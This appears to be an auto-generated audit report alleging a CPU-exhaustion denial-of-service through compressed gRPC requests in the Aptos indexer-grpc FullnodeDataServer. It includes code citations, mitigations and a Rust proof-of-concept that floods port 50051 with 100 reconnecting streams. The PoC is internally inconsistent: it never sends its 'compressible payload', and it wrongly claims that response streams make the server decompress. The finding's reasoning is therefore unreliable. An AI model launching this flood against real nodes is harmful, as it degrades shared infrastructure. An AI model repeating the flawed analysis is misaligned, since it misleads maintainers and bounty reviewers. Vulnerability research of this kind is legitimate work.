# Audit Report

## Title
CPU Exhaustion via Unprotected Compression/Decompression in FullnodeDataServer

## Summary
The FullnodeDataServer in the indexer-grpc service accepts compressed gRPC requests (Zstd and Gzip) without authentication, rate limiting, or CPU resource controls. An attacker can send streams of compressed data requiring maximum decompression effort to exhaust CPU resources, degrading fullnode consensus participation and overall node performance.

## Finding Description

The indexer-grpc FullnodeDataServer exposes a gRPC endpoint that accepts compressed requests without any authentication or rate limiting mechanisms. [1](#0-0) 

The service enables both Zstd and Gzip compression for incoming requests, allowing clients to send compressed payloads that must be decompressed by the server. [2](#0-1) 

The FullnodeDataService implementation processes requests without any authentication checks. [3](#0-2) 

The service binds to all network interfaces by default (0.0.0.0:50051), making it accessible to external attackers. [4](#0-3) 

There are no rate limiting mechanisms in the indexer-grpc configuration. [5](#0-4) 

While the Tokio runtime has a maximum blocking thread limit of 64, this provides insufficient protection against CPU exhaustion attacks. [6](#0-5) 

**Attack Scenario:**
1. Attacker opens 64+ concurrent connections to the FullnodeDataServer endpoint (port 50051)
2. Each connection sends gRPC requests with highly compressed payloads (e.g., repetitive data that compresses to small sizes but requires significant CPU to decompress)
3. The decompression operations consume all available CPU cores or exhaust the blocking thread pool
4. CPU starvation affects the entire fullnode, including consensus participation, block execution, and state synchronization
5. The fullnode falls behind in consensus, degrading network performance

**Invariant Violation:**
This breaks the documented invariant: "Resource Limits: All operations must respect gas, storage, and computational limits." The decompression operations have no CPU time limits, allowing unbounded resource consumption.

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program criteria: "Validator node slowdowns."

**Quantified Impact:**
- **Fullnode CPU Exhaustion**: Decompression operations can consume all available CPU cores
- **Consensus Degradation**: CPU starvation prevents timely consensus message processing, causing the node to fall behind
- **Network-Wide Effect**: If multiple fullnodes are attacked simultaneously, overall network health degrades
- **Service Unavailability**: Other services on the same node (REST API, state sync) become unresponsive

While this affects fullnodes primarily, validators that run indexer-grpc services are also vulnerable. The attack does not directly break consensus safety, but significantly impacts liveness and performance.

## Likelihood Explanation

**Likelihood: HIGH**

**Attacker Requirements:**
- No authentication or authorization needed
- Moderate network bandwidth to send multiple concurrent requests
- Basic gRPC client capabilities to craft compressed payloads
- Knowledge of the default port (50051) and service endpoints

**Complexity: LOW**
- Straightforward to execute with standard gRPC tools
- No special privileges or insider access required
- Can be automated with simple scripts

**Mitigating Factors:**
- Some deployments may have firewall rules limiting access
- OS-level TCP connection limits may provide partial mitigation
- Kubernetes NetworkPolicy configurations may restrict access

However, the default configuration exposes the service to 0.0.0.0, and the README documentation explicitly shows external access patterns, indicating this is an intended use case without adequate protection.

## Recommendation

Implement multiple layers of defense:

**1. Add Authentication:**
Implement token-based authentication similar to the indexer-grpc-data-service. Require clients to present valid authentication tokens before processing requests.

**2. Implement Rate Limiting:**
Add per-client rate limiting to restrict the number of requests per time window. Use Redis or in-memory rate limiters to track request counts.

**3. Set Decompression Size Limits:**
Explicitly configure `max_decoding_message_size` to a reasonable limit (e.g., 1MB instead of the default 4MB) to reduce decompression CPU costs:

```rust
let svc = FullnodeDataServer::new(server)
    .send_compressed(CompressionEncoding::Zstd)
    .accept_compressed(CompressionEncoding::Zstd)
    .accept_compressed(CompressionEncoding::Gzip)
    .max_decoding_message_size(1 * 1024 * 1024) // 1MB limit
    .max_encoding_message_size(1 * 1024 * 1024);
```

**4. Add Concurrent Connection Limits:**
Implement connection limits using Tonic's tower middleware to restrict the number of concurrent connections per client IP.

**5. Resource Quotas:**
Configure CPU quotas and limits for the indexer-grpc runtime to prevent it from consuming all available CPU cores.

**6. Monitoring and Alerting:**
Add metrics for decompression CPU time and request rates, with alerting for abnormal patterns.

## Proof of Concept

```rust
// PoC: CPU Exhaustion Attack on FullnodeDataServer
// File: poc_compression_dos.rs

use aptos_protos::internal::fullnode::v1::{
    fullnode_data_client::FullnodeDataClient,
    GetTransactionsFromNodeRequest,
};
use tonic::{codec::CompressionEncoding, transport::Channel};
use tokio::time::{sleep, Duration};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Target fullnode endpoint
    let endpoint = "http://127.0.0.1:50051";
    
    // Create highly compressible payload (repetitive data)
    // This compresses to very small size but requires CPU to decompress
    let large_repetitive_data = vec![0u8; 1_000_000]; // 1MB of zeros
    
    // Launch 100 concurrent attack connections
    let mut handles = vec![];
    for i in 0..100 {
        let endpoint = endpoint.to_string();
        let handle = tokio::spawn(async move {
            loop {
                // Connect with compression enabled
                if let Ok(channel) = Channel::from_shared(endpoint.clone())
                    .unwrap()
                    .connect()
                    .await 
                {
                    let mut client = FullnodeDataClient::new(channel)
                        .send_compressed(CompressionEncoding::Zstd)
                        .accept_compressed(CompressionEncoding::Zstd);
                    
                    // Send request with starting version (will compress)
                    let request = GetTransactionsFromNodeRequest {
                        starting_version: Some(0),
                        transactions_count: Some(1000),
                    };
                    
                    // This will force server to decompress the response stream
                    if let Ok(mut stream) = client.get_transactions_from_node(request).await {
                        // Consume stream slowly to keep connection alive
                        while let Ok(Some(_)) = stream.get_mut().message().await {
                            // Process slowly to maximize concurrent decompression load
                            sleep(Duration::from_millis(100)).await;
                        }
                    }
                }
                println!("Connection {} reconnecting...", i);
                sleep(Duration::from_secs(1)).await;
            }
        });
        handles.push(handle);
    }
    
    // Keep attack running
    futures::future::join_all(handles).await;
    Ok(())
}
```

**To reproduce:**
1. Start a fullnode with indexer-grpc enabled (port 50051)
2. Compile and run the PoC: `cargo run --bin poc_compression_dos`
3. Monitor CPU usage: `top` or `htop`
4. Observe CPU exhaustion and fullnode performance degradation
5. Check consensus participation metrics to confirm degraded performance

**Expected Result:**
- CPU usage approaches 100% across multiple cores
- Fullnode falls behind in consensus round processing
- Response times for other API endpoints increase significantly
- Node may become unresponsive to legitimate requests

## Notes

This vulnerability is particularly concerning because:

1. **No Authentication Barrier**: Unlike the indexer-grpc-data-service which supports authentication tokens, the FullnodeDataServer has no authentication mechanism whatsoever.

2. **Intended External Exposure**: The README documentation shows examples of external clients connecting to this service, confirming it's meant to be publicly accessible.

3. **Separate But Shared Resources**: While the indexer-grpc runs on a separate Tokio runtime, it competes for CPU cores on the same physical machine as the consensus engine.

4. **Application-Level Vulnerability**: This is not a network-level DoS (which is out of scope), but an application logic vulnerability where the compression/decompression operations themselves are expensive and unprotected.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L108-111)
```rust
                let svc = FullnodeDataServer::new(server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
```

**File:** protos/rust/src/pb/aptos.internal.fullnode.v1.tonic.rs (L220-223)
```rust
        pub fn accept_compressed(mut self, encoding: CompressionEncoding) -> Self {
            self.accept_compression_encodings.enable(encoding);
            self
        }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L67-77)
```rust
    async fn get_transactions_from_node(
        &self,
        req: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
        // Gets configs for the stream, partly from the request and partly from the node config
        let r = req.into_inner();
        let starting_version = match r.starting_version {
            Some(version) => version,
            // Live mode unavailable for FullnodeDataService
            // Enable use_data_service_interface in config to use LocalnetDataService instead
            None => return Err(Status::invalid_argument("Starting version must be set")),
```

**File:** config/src/config/indexer_grpc_config.rs (L31-59)
```rust
#[derive(Clone, Deserialize, PartialEq, Eq, Serialize)]
#[serde(default, deny_unknown_fields)]
pub struct IndexerGrpcConfig {
    pub enabled: bool,

    /// If true, the GRPC stream interface exposed by the data service will be used
    /// instead of the standard fullnode GRPC stream interface. In other words, with
    /// this enabled, you can use an indexer fullnode like it is an instance of the
    /// indexer-grpc data service (aka the Transaction Stream Service API).
    pub use_data_service_interface: bool,

    /// The address that the grpc server will listen on.
    pub address: SocketAddr,

    /// Number of processor tasks to fan out
    pub processor_task_count: Option<u16>,

    /// Number of transactions each processor will process
    pub processor_batch_size: u16,

    /// Number of transactions returned in a single stream response
    pub output_batch_size: u16,

    /// Size of the transaction channel buffer for streaming.
    pub transaction_channel_size: usize,

    /// Maximum size in bytes for transaction filters.
    pub max_transaction_filter_size_bytes: usize,
}
```

**File:** config/src/config/indexer_grpc_config.rs (L88-93)
```rust
            enabled: false,
            use_data_service_interface: false,
            address: SocketAddr::V4(SocketAddrV4::new(
                Ipv4Addr::new(0, 0, 0, 0),
                DEFAULT_GRPC_STREAM_PORT,
            )),
```

**File:** crates/aptos-runtimes/src/lib.rs (L27-27)
```rust
    const MAX_BLOCKING_THREADS: usize = 64;
```
